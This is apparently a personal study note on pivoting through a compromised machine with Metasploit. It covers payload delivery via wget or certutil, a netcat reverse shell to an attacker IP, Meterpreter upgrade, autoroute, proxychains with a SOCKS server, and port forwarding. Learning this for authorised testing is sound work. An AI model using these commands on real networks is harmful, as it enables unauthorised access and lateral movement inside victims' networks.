Note title: Untitled

First step upon accessing a machine and seeing it has a new network  
This helps us see how many hosts are on this network that the machine can detect  
`for i in {1..254} ;do (ping -c 1 192.168.0.$i | grep "from" &) ;done`

To perform pivoting with Metasploit, we need a Meterpreter shell. We achieve this by receiving a regular shell in Metasploit and then upgrading it to a Meterpreter shell.

Steps for pivoting:  
Open Metasploit on the attacker machine.  

Use the `multi/handler` exploit.  
![[Pasted image 20260404170354.png]]  
Once inside, we need to set the parameters requested in `show options`, which are the IP of our machine and the port it should listen on.  
![[Pasted image 20260404170500.png]]  
Now, we need to configure the payload used, which is the one we used with `msfvenom` for the reverse shell.  
![[Pasted image 20260404170632.png]]  
This reverse shell must be uploaded to the victim machine. Typically, we first gain access to the machine through other methods, and once inside, we set up an HTTP server on our attacker machine and use `wget` or `certutil.exe` on Windows to download the file.  
![[Pasted image 20260404170856.png]]  

Once the payload is placed on the victim and everything is configured in Metasploit, we simply need to start listening in Metasploit by running `run` and executing the reverse shell on the victim.  

Once connected, we press `Ctrl+Z` in Metasploit and add the new network that we can only see from the victim machine with: `run autoroute -s <internal_network>/24`  

**NOTE**  

We can also, if we are root on the pivot machine and it has `netcat` installed, run `nc <attacker_ip> <attacker_port> -e /bin/bash` while Metasploit is listening, and we will get a shell, but not a Meterpreter shell.  
![[Pasted image 20260404172844.png]]  
![[Pasted image 20260404172907.png]]  
Now, we press `Ctrl+Z` and upgrade to a Meterpreter shell using the `shell_to_meterpreter` module in Metasploit.  
![[Pasted image 20260404173026.png]]  
![[Pasted image 20260404173050.png]]  
![[Pasted image 20260404173112.png]]  
And with a `run`, it will upgrade.  
![[Pasted image 20260404173152.png]]  
Now, we configure the routes, which can be done either manually or automatically.  

The manual way is:  
Using `route add - <network_segment> - <session_through_which_we_want_to_access_this_network>`  
![[Pasted image 20260404173328.png]]  
![[Pasted image 20260404173429.png]]  
This allows us to see the network segment, but only within Metasploit and not outside of it.  

The automatic way is:  
Using the `autoroute` module, and we only need to specify the session ID.  
![[Pasted image 20260404173722.png]]  

Here, we have two options: we can use `proxychains` so that Metasploit acts as a proxy, allowing us to use tools from our terminal and not just within Metasploit.  
https://books.spartan-cybersec.com/cppj/pivoting-for-juniors/que-es-socks  

**Using proxychains in the Meterpreter session**  
`use auxiliary/server/socks4a`  
`set SRVHOST 0.0.0.0`  
`set SRVPORT 1080`  
`run`  
**ATTACKER MACHINE**  
`echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf`  

`proxychains nmap -sT -Pn -n -p 80,443 <target_internal_IP>`  

The other option is to do everything within Metasploit.  
To use `nmap`, it would be:  
![[Pasted image 20260404174351.png]]  

Or using Metasploit's built-in port scanner:  
![[Pasted image 20260404174455.png]]  
![[Pasted image 20260404174507.png]]  
Now that we have scanned the ports and know which ones are open, we need to perform port forwarding because otherwise, we won't have access to port 80, for example.  

We need to enter the pivot machine's session and use `portfwd add -l <local_port> (e.g., 8080) -p <remote_port> (e.g., 80) -r <remote_machine_ip>`  
![[Pasted image 20260404175310.png]]  

And if we now try to access port 8080 on our attacker machine's localhost, we will see port 80 of the remote machine.  
![[Pasted image 20260404175404.png]]
